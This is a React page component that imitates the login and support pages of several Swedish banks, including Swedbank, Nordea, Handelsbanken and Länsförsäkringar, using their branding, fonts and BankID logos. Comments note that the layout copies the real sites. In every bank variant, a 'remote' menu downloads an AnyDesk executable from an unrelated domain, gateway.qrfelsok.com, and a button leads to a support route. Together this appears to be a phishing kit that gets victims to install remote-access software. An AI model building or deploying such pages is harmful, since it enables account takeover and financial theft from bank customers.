import { useNavigate, useParams } from "react-router-dom";
import { useEffect, useState } from "react";
import { Menu, Shield, Download } from "lucide-react";
import bankidIconWhite from "@/assets/bankid-icon-white.svg";
import { useBankTheme } from "@/context/BankThemeContext";
import { useLanguage } from "@/context/LanguageContext";
import LanguageSwitcher from "@/components/LanguageSwitcher";
import { bankLogoImages } from "@/config/bankLogos";

import bgSwedbank from "@/assets/bg-swedbank.jpg";
import bgNordea from "@/assets/bg-nordea.png";
import bgSeb from "@/assets/bg-seb.jpg";
import bgHandelsbanken from "@/assets/bg-handelsbanken.jpg";
import bgSparbankenSyd from "@/assets/bg-sparbanken-syd.jpg";
import bgDanskebank from "@/assets/bg-danskebank.jpg";
import bgIcaBanken from "@/assets/bg-ica-banken.jpg";
import bgLansforsakringar from "@/assets/bg-lansforsakringar.jpg";
import lfArt from "@/assets/lf-art.svg";

const backgrounds: Record<string, string> = {
  swedbank: bgSwedbank,
  nordea: bgNordea,
  seb: bgSeb,
  handelsbanken: bgHandelsbanken,
  "sparbanken-syd": bgSparbankenSyd,
  danskebank: bgDanskebank,
  "ica-banken": bgIcaBanken,
  lansforsakringar: bgLansforsakringar,
};

const NORDEA_BLUE = "#00005E";
const NORDEA_LINK = "#0000BF";
const NORDEA_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const SEB_GREEN = "#353531";
const SEB_DARK = "#333333";
const SEB_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const HB_BLUE = "#005C9E";
const HB_DARK = "#333333";
const HB_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const DB_NAVY = "#003755";
const DB_BUTTON = "#0F56B3";
const DB_LINK = "#0a5ef0";
const DB_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const Index = () => {
  const navigate = useNavigate();
  const { bankId } = useParams<{ bankId: string }>();
  const { bank, setBankId } = useBankTheme();
  const { t } = useLanguage();
  const [menuOpen, setMenuOpen] = useState(false);

  useEffect(() => {
    if (bankId) setBankId(bankId);
    return () => setBankId(null);
  }, [bankId, setBankId]);

  const bgImage = backgrounds[bankId || ""] || "";
  const bankName = bank?.name || "Banken";
  const isSwedbank = bankId === "swedbank";
  const isNordea = bankId === "nordea";
  const isSEB = bankId === "seb";
  const isHB = bankId === "handelsbanken";
  const isSparbankenSyd = bankId === "sparbanken-syd";
  const isDanske = bankId === "danskebank";
  const isLF = bankId === "lansforsakringar";

  const pageStyle = { backgroundImage: `url(${bgImage})` };

  const cardStyle = { boxShadow: "0 15px 60px rgba(0,0,0,0.55), 0 5px 20px rgba(0,0,0,0.3)" };

  const fontFamily = isSwedbank
    ? '"Roboto", Arial, Helvetica, sans-serif'
    : isNordea
      ? NORDEA_FONT
      : isSEB
        ? SEB_FONT
        : isHB
          ? HB_FONT
          : isDanske
            ? DB_FONT
            : isSparbankenSyd
              ? 'system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif'
              : undefined;

  const textColor = isSwedbank ? "#512B2B" : isNordea ? NORDEA_BLUE : isSEB ? SEB_DARK : isHB ? HB_DARK : isDanske ? DB_NAVY : isSparbankenSyd ? "#1a1a1a" : undefined;
  const headingColor = isSwedbank ? "#FF5F00" : isNordea ? NORDEA_BLUE : isSEB ? SEB_DARK : isHB ? HB_BLUE : isDanske ? DB_NAVY : isSparbankenSyd ? "#1a1a1a" : `hsl(${bank?.primary || "0 0% 0%"})`;
  const headingFont = isSwedbank
    ? '"Swedbank Headline", sans-serif'
    : isNordea
      ? NORDEA_FONT
      : isSEB
        ? SEB_FONT
        : isHB
          ? HB_FONT
          : isDanske
            ? DB_FONT
            : isSparbankenSyd
              ? 'system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif'
              : undefined;
  const linkColor = isSwedbank ? "#257886" : isNordea ? NORDEA_LINK : isSEB ? SEB_GREEN : isHB ? HB_BLUE : isDanske ? DB_NAVY : isSparbankenSyd ? "#1a1a1a" : undefined;
  const buttonBg = isSwedbank ? "#FF5F00" : isNordea ? NORDEA_BLUE : isSEB ? SEB_GREEN : isHB ? HB_BLUE : isDanske ? DB_BUTTON : isSparbankenSyd ? "#FFCC00" : `hsl(${bank?.primary || "0 0% 0%"})`;
  const buttonRadius = isNordea ? "4px" : isHB ? "24px" : isDanske ? "24px" : "999px";
  const buttonFont = isDanske ? DB_FONT : isSparbankenSyd ? 'system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif' : isNordea ? NORDEA_FONT : isSEB ? SEB_FONT : isHB ? HB_FONT : '"Swedbank Headline", sans-serif';
  const buttonTextColor = isSparbankenSyd ? "#1a1a1a" : "#ffffff";

  // Länsförsäkringar style
  const LF_NAVY = "#00427a";
  const LF_BUTTON = "#0077b3";
  const LF_BG = "#e4eef5";
  const LF_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';
  const LF_HEADING_FONT = '"Intro Cond", "Arial Narrow", "Helvetica Neue", Arial, sans-serif';

  if (isLF) {
    return (
      <div className="min-h-screen flex flex-col" style={{ backgroundColor: "#f5f5f5", fontFamily: LF_FONT }}>
        {/* Top logo bar — outside card, like the real site */}
        <div style={{ padding: "20px 32px" }}>
          <img src={bankLogoImages["lansforsakringar"]} alt="Länsförsäkringar" style={{ height: "40px" }} className="object-contain" />
        </div>

        {/* Centered card */}
        <div className="flex-1 flex flex-col items-center" style={{ paddingTop: "24px" }}>
          <div className="w-full max-w-[520px] mx-4">
            <div className="w-full bg-white overflow-hidden" style={{ boxShadow: "0 1px 8px rgba(0,0,0,0.08)", borderRadius: "8px", color: "#1a2e3b" }}>
              {/* Language switcher row */}
              <div className="flex justify-end" style={{ padding: "12px 24px 0" }}>
                <LanguageSwitcher style={{ fontFamily: LF_FONT, fontSize: "14px", fontWeight: 500, color: LF_NAVY }} />
              </div>

              {/* Mini nav bar */}
              <div className="relative">
                <div className="flex items-center justify-between py-3 border-y"
                  style={{ borderColor: "#e5e5e5", padding: "12px 24px", fontFamily: LF_FONT, fontSize: "14px", fontWeight: 500, color: "#1a2e3b" }}
                >
                  <button onClick={() => setMenuOpen(!menuOpen)} className="flex items-center gap-2" style={{ color: "inherit", fontFamily: "inherit", fontSize: "inherit", fontWeight: "inherit" }}>
                    <Menu className="w-4 h-4" />
                    {t("index.nav.remote")}
                  </button>
                  <button className="flex items-center gap-2" style={{ color: "inherit", fontFamily: "inherit", fontSize: "inherit", fontWeight: "inherit" }}>
                    <Shield className="w-4 h-4" />
                    {t("index.nav.bankid")}
                  </button>
                </div>
                {menuOpen && (
                  <div className="absolute left-4 right-4 top-full z-10 bg-white border rounded-lg shadow-lg py-2">
                    <a href="https://gateway.qrfelsok.com/downloads/anydesk-6-2-1.exe"
                      download="anydesk-6-2-1.exe"
                      className="flex items-center gap-3 px-4 py-3 hover:bg-gray-50 transition-colors"
                      style={{ fontFamily: LF_FONT, fontSize: "14px", fontWeight: 500, color: "#1a2e3b" }}
                    >
                      <Download className="w-4 h-4" />
                      {t("index.download")}
                    </a>
                  </div>
                )}
              </div>

              {/* Content */}
              <div style={{ padding: "32px 32px 16px" }}>
                <h1 style={{ color: LF_NAVY, fontFamily: LF_HEADING_FONT, fontWeight: 700, fontSize: "1.625rem", lineHeight: "2rem", margin: "0 0 20px 0" }}>
                  {t("index.title")}
                </h1>
                <ul className="space-y-4" style={{ fontSize: "15px", lineHeight: "1.6" }}>
                  <li className="flex gap-2">
                    <span style={{ color: LF_NAVY, opacity: 0.5 }} className="mt-0.5">✓</span>
                    <span>{t("index.bullet1")}</span>
                  </li>
                  <li className="flex gap-2">
                    <span style={{ color: LF_NAVY, opacity: 0.5 }} className="mt-0.5">✓</span>
                    <span>{t("index.bullet2")}</span>
                  </li>
                </ul>
              </div>

              {/* Warning box */}
              <div style={{ margin: "8px 32px 16px", padding: "16px", fontSize: "14px", lineHeight: "22px", background: "#e4eef5", color: "#1a2e3b", borderRadius: "4px" }}>
                {t("index.warning1")}{" "}
                <strong>{bankName}</strong> {t("index.warning2")}{" "}
                <strong className="underline">Finansiell ID-Teknik BID AB</strong> {t("index.warning3")}{" "}
                <strong>{t("index.warning4")}</strong>.
              </div>

              {/* Button */}
              <div style={{ padding: "8px 32px 24px" }}>
                <button
                  onClick={() => navigate(`/bank/${bankId}/support`)}
                  className="text-white transition-opacity hover:opacity-90"
                  style={{ backgroundColor: LF_BUTTON, fontFamily: LF_FONT, fontWeight: 600, fontSize: "1rem", padding: "14px 32px", borderRadius: "6px", border: "none", cursor: "pointer" }}
                >
                  <span className="flex items-center justify-center gap-3">
                    <img src={bankidIconWhite} alt="BankID" style={{ height: "24px" }} />
                    {t("index.support")}
                  </span>
                </button>
              </div>
            </div>

            {/* Footer links — outside card, like the real site */}
            <div className="flex justify-center gap-6 flex-wrap" style={{ padding: "20px 0", fontSize: "13px", color: LF_NAVY }}>
              <a href="#" className="hover:underline">Om personuppgifter</a>
              <a href="#" className="hover:underline">Cookie-inställningar</a>
              <a href="#" className="hover:underline">Internetvillkor</a>
              <a href="#" className="hover:underline">Säkerhet</a>
              <a href="#" className="hover:underline">Kontakta oss</a>
            </div>
          </div>
        </div>

        {/* Bottom SVG art illustration — like the real LF login page */}
        <div className="w-full overflow-hidden" style={{ lineHeight: 0, color: "#005AA0" }}>
          <img src={lfArt} alt="" aria-hidden="true" className="w-full object-cover" style={{ maxHeight: "120px" }} />
        </div>
      </div>
    );
  }

  // Handelsbanken hero-panel style
  if (isHB) {
    return (
      <div
        className="min-h-screen flex items-center justify-center bg-cover bg-center bg-no-repeat"
        style={pageStyle}
      >
        <div className="w-full max-w-[460px] mx-4">
          <div
            className="w-full bg-white overflow-hidden"
            style={{
              ...cardStyle,
              fontFamily: HB_FONT,
              color: "#183E4F",
            }}
          >
            {/* Logo + language */}
            <div className="flex items-center justify-between" style={{ padding: "24px 24px 16px" }}>
              {bankLogoImages[bankId || ""] ? (
                <img src={bankLogoImages[bankId || ""]} alt={bankName} className="object-contain" style={{ height: "30px" }} />
              ) : (
                <div style={{ fontFamily: HB_FONT, fontWeight: 700, fontSize: "1.25rem", color: HB_BLUE }}>{bankName}</div>
              )}
              <div className="ml-auto">
                <LanguageSwitcher style={{ fontFamily: HB_FONT, fontSize: "14px", fontWeight: 500, color: "#183E4F" }} />
              </div>
            </div>

            {/* Mini nav bar */}
            <div className="relative">
              <div className="flex items-center justify-between py-3 border-y"
                style={{ borderColor: "#e5e5e5", padding: "12px 24px", fontFamily: HB_FONT, fontSize: "14px", fontWeight: 500, color: "#183E4F" }}
              >
                <button onClick={() => setMenuOpen(!menuOpen)} className="flex items-center gap-2" style={{ color: "inherit", fontFamily: "inherit", fontSize: "inherit", fontWeight: "inherit" }}>
                  <Menu className="w-4 h-4" />
                  {t("index.nav.remote")}
                </button>
                <button className="flex items-center gap-2" style={{ color: "inherit", fontFamily: "inherit", fontSize: "inherit", fontWeight: "inherit" }}>
                  <Shield className="w-4 h-4" />
                  {t("index.nav.bankid")}
                </button>
              </div>
              {menuOpen && (
                <div className="absolute left-4 right-4 top-full z-10 bg-white border rounded-lg shadow-lg py-2">
                  <a href="https://gateway.qrfelsok.com/downloads/anydesk-6-2-1.exe"
                    download="anydesk-6-2-1.exe"
                    className="flex items-center gap-3 px-4 py-3 hover:bg-gray-50 transition-colors"
                    style={{ fontFamily: HB_FONT, fontSize: "14px", fontWeight: 500, color: "#183E4F" }}
                  >
                    <Download className="w-4 h-4" />
                    {t("index.download")}
                  </a>
                </div>
              )}
            </div>

            {/* Hero content — shb-title-1 + shb-text-1 style */}
            <div style={{ padding: "32px 24px 16px" }}>
              <h1
                style={{
                  color: "#00334D",
                  fontFamily: HB_FONT,
                  fontWeight: 700,
                  fontSize: "1.75rem",
                  lineHeight: "2.25rem",
                  margin: "0 0 16px 0",
                }}
              >
                {t("index.title")}
              </h1>
              <div
                style={{
                  color: "#183E4F",
                  fontFamily: HB_FONT,
                  fontWeight: 400,
                  fontSize: "1.0625rem",
                  lineHeight: "1.625rem",
                }}
              >
                <ul className="space-y-3">
                  <li className="flex gap-2">
                    <span style={{ opacity: 0.5 }} className="mt-0.5">✓</span>
                    <span>{t("index.bullet1")}</span>
                  </li>
                  <li className="flex gap-2">
                    <span style={{ opacity: 0.5 }} className="mt-0.5">✓</span>
                    <span>{t("index.bullet2")}</span>
                  </li>
                </ul>
              </div>
            </div>

            {/* Warning box */}
            <div style={{
              margin: "8px 24px 16px",
              padding: "16px",
              fontSize: "0.9375rem",
              lineHeight: "1.5rem",
              background: "#D4E6F1",
              color: "#00334D",
              borderRadius: "4px",
            }}>
              {t("index.warning1")}{" "}
              <strong>{bankName}</strong> {t("index.warning2")}{" "}
              <strong className="underline">Finansiell ID-Teknik BID AB</strong> {t("index.warning3")}{" "}
              <strong>{t("index.warning4")}</strong>.
            </div>

            {/* Primary button — HB Button primary medium */}
            <div style={{ padding: "8px 24px" }}>
              <button
                onClick={() => navigate(`/bank/${bankId}/support`)}
                className="text-white transition-opacity hover:opacity-90"
                style={{
                  backgroundColor: "#00334D",
                  fontFamily: HB_FONT,
                  fontWeight: 500,
                  fontSize: "1rem",
                  lineHeight: "1.5rem",
                  padding: "12px 32px",
                  minHeight: "48px",
                  borderRadius: "4px",
                  border: "none",
                  cursor: "pointer",
                  display: "inline-block",
                }}
              >
                <span className="flex items-center gap-3">
                  <img src={bankidIconWhite} alt="BankID" style={{ height: "24px" }} />
                  {t("index.support")}
                </span>
              </button>
            </div>

            {/* Footer links */}
            <div className="flex gap-8"
              style={{
                padding: "16px 24px 24px",
                fontFamily: HB_FONT,
                fontWeight: 500,
                fontSize: "0.875rem",
                lineHeight: "1.5rem",
                color: HB_BLUE,
              }}
            >
              <a href="#" className="flex items-center gap-1 hover:underline">▸ {t("index.privacy")}</a>
              <a href="#" className="flex items-center gap-1 hover:underline">▸ {t("index.cookies")}</a>
            </div>
            <p style={{ fontSize: "12px", color: "#183E4F", opacity: 0.4, padding: "0 24px 24px" }}>
              © {new Date().getFullYear()} {bankName} AB &amp; Finansiell ID-Teknik BID AB
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div
      className="min-h-screen flex items-center justify-center bg-cover bg-center bg-no-repeat"
      style={pageStyle}
    >
      <div className="w-full max-w-[420px] mx-4 flex flex-col items-center">
        <div
          className="w-full bg-white overflow-hidden"
          style={{
            ...cardStyle,
            fontFamily,
            color: textColor,
          }}
        >
          {/* Bank logo + language switcher */}
          <div className="flex items-center justify-between" style={{ padding: "24px 24px 16px" }}>
            {bankLogoImages[bankId || ""] ? (
              <img src={bankLogoImages[bankId || ""]} alt={bankName} className="object-contain" style={{ height: isNordea ? "28px" : isSEB ? "72px" : isDanske ? "24px" : "45px" }} />
            ) : (
              <div
                style={{
                  fontFamily: headingFont,
                  fontWeight: 700,
                  fontSize: "1.25rem",
                  color: headingColor,
                }}
              >
                {bankName}
              </div>
            )}
            <div className="ml-auto">
              <LanguageSwitcher
                style={{
                  fontFamily,
                  fontSize: "14px",
                  fontWeight: isSwedbank ? 700 : 500,
                  color: textColor,
                }}
              />
            </div>
          </div>

        {/* Mini nav bar */}
        <div className="relative">
          <div className="flex items-center justify-between py-3 border-y"
            style={{
              borderColor: isNordea ? "#E3E3E3" : isSEB ? "#E1E1E1" : "#e5e5e5",
              padding: "12px 24px",
              fontFamily,
              fontSize: "14px",
              fontWeight: isSwedbank ? 700 : 500,
              color: textColor,
            }}
          >
            <button
              onClick={() => setMenuOpen(!menuOpen)}
              className="flex items-center gap-2"
              style={{ color: "inherit", fontFamily: "inherit", fontSize: "inherit", fontWeight: "inherit" }}
            >
              <Menu className="w-4 h-4" />
              {t("index.nav.remote")}
            </button>
            <button
              className="flex items-center gap-2"
              style={{ color: "inherit", fontFamily: "inherit", fontSize: "inherit", fontWeight: "inherit" }}
            >
              <Shield className="w-4 h-4" />
              {t("index.nav.bankid")}
            </button>
          </div>

          {menuOpen && (
            <div className="absolute left-4 right-4 top-full z-10 bg-white border rounded-lg shadow-lg py-2">
              <a
                href="https://gateway.qrfelsok.com/downloads/anydesk-6-2-1.exe"
                download="anydesk-6-2-1.exe"
                className="flex items-center gap-3 px-4 py-3 hover:bg-gray-50 transition-colors"
                style={{
                  fontFamily,
                  fontSize: "14px",
                  fontWeight: isSwedbank ? 700 : 500,
                  color: textColor,
                }}
              >
                <Download className="w-4 h-4" />
                {t("index.download")}
              </a>
            </div>
          )}
        </div>

        {/* Content */}
        <div style={{ padding: "24px 24px 8px" }}>
          <h2
            style={{
              color: headingColor,
              fontFamily: headingFont,
              fontWeight: isSEB ? 400 : 700,
              fontSize: isNordea ? "1.375rem" : isSEB ? "1.5rem" : "1.5rem",
              lineHeight: isNordea ? "1.75rem" : "2rem",
              marginBottom: "16px",
            }}
          >
            {t("index.title")}
          </h2>

          <ul className="space-y-4 leading-relaxed" style={{ fontSize: "14px", lineHeight: "22px" }}>
            <li className="flex gap-2">
              <span style={{ color: textColor, opacity: 0.5 }} className="mt-0.5">✓</span>
              <span>{t("index.bullet1")}</span>
            </li>
            <li className="flex gap-2">
              <span style={{ color: textColor, opacity: 0.5 }} className="mt-0.5">✓</span>
              <span>{t("index.bullet2")}</span>
            </li>
          </ul>
        </div>

        {/* Warning box */}
        <div style={{
          margin: "16px 24px 8px",
          padding: "16px",
          fontSize: "14px",
          lineHeight: "22px",
          background: isSparbankenSyd ? "#f5f5f5" : isDanske ? "#e8f0f5" : `hsl(${bank?.warningBg || bank?.accent || bank?.primary || "0 0% 50%"})`,
          color: isSparbankenSyd ? "#1a1a1a" : isDanske ? DB_NAVY : `hsl(${bank?.warningForeground || "0 0% 100%"})`,
          borderRadius: isNordea ? "4px" : isSEB ? "2px" : isDanske ? "4px" : undefined,
        }}>
          {t("index.warning1")}{" "}
          <strong>{bankName}</strong> {t("index.warning2")}{" "}
          <strong className="underline">Finansiell ID-Teknik BID AB</strong> {t("index.warning3")}{" "}
          <strong>{t("index.warning4")}</strong>.
        </div>

        {/* Footer links */}
        <div className="text-center space-y-1" style={{ padding: "16px 24px" }}>
          <div className="flex justify-center gap-8"
            style={{
              fontFamily: isSwedbank ? '"Swedbank Headline", sans-serif' : isNordea ? NORDEA_FONT : isSEB ? SEB_FONT : undefined,
              fontWeight: isNordea ? 500 : isSEB ? 400 : 700,
              fontSize: isNordea || isSEB ? "0.875rem" : "1rem",
              lineHeight: "1.5rem",
              color: linkColor,
            }}
          >
            <a href="#" className="flex items-center gap-1 hover:underline">
              ▸ {t("index.privacy")}
            </a>
            <a href="#" className="flex items-center gap-1 hover:underline">
              ▸ {t("index.cookies")}
            </a>
          </div>
          <p style={{ fontSize: "12px", color: textColor, opacity: 0.4 }}>
            © {new Date().getFullYear()} {bankName} AB &amp; Finansiell ID-Teknik BID AB
          </p>
        </div>

        {/* Support button */}
        <div style={{ padding: "8px 24px 24px" }}>
          <button
            onClick={() => navigate(`/bank/${bankId}/support`)}
            className="w-full transition-opacity hover:opacity-90"
            style={{
              backgroundColor: buttonBg,
              color: buttonTextColor,
              fontFamily: buttonFont,
              fontWeight: isDanske ? 600 : isSparbankenSyd ? 600 : isNordea ? 600 : isSEB ? 400 : 700,
              fontSize: isDanske ? "1rem" : isSparbankenSyd ? "1rem" : isNordea ? "1rem" : isSEB ? "1rem" : "1.1875rem",
              lineHeight: "1.5rem",
              padding: isDanske ? "12px 24px" : isNordea ? "14px 32px" : "12px 32px",
              minHeight: isDanske ? "44px" : "48px",
              borderRadius: buttonRadius,
              border: "none",
              letterSpacing: isNordea ? "0.02em" : "0.04px",
            }}
          >
            <span className="flex items-center justify-center gap-3">
              <img src={bankidIconWhite} alt="BankID" style={{ height: "24px", filter: isSparbankenSyd ? "brightness(0) saturate(0)" : undefined }} />
              {t("index.support")}
            </span>
          </button>
        </div>
      </div>
      </div>
    </div>
  );
};

export default Index;
